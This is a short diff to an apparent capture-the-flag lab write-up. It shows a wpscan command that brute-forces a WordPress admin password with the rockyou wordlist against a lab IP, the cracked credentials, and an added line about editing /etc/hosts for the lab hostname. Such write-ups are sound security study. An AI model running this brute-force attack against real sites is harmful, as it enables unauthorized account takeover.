@@ -57,3 +57,5 @@ Using this info, bruteforced passwords
 	```wpscan --url 10.10.111.161/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50```
 	Password Cracked: Username: admin, Password: my2boys  
 
+Modifyied /etc/hosts to help resolve name(internal.thm --> $TARGET_IP)  
+
